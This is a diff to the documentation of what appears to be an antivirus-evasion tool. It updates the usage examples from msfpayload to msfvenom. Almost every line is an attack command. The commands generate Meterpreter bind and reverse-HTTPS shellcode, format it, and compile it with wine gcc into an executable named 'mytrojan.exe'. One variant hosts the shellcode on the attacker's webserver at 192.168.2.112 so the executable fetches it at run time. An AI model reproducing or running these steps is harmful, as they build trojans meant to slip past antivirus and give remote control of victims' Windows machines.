@@ -51,7 +51,7 @@ Example 2, loading shellcode from a webserver:
 
 Attackers machine:
 ```
-$ msfpayload windows/meterpreter/bind_tcp C > sc.txt
+$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
 $ ./format.sh sc.txt > sc_clean.txt
 ```
 
@@ -78,7 +78,7 @@ $ gcc -o make_avet make_avet.c
 
 Example 1, compile shellcode into the .exe file:
 ```
-$ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
+$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
 $ ./format.sh sh.txt > sh_clean.txt
 $ ./make_avet -f sh_clean.txt
 $ wine gcc.exe -o mytrojan.exe avet.c
@@ -86,7 +86,7 @@ $ wine gcc.exe -o mytrojan.exe avet.c
 
 Example 2, make an .exe file that downloads a shellcode from a webserver:
 ```
-$ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
+$ msfvenom -p windows/meterpreter/bind_tcp -f c -a x86 --platform Windows > sh.txt
 $ ./format.sh sh.txt > sh_clean.txt
 $ cp sh_clean.txt /var/www
 $ ./make_avet -u 192.168.2.112/sh_clean.txt
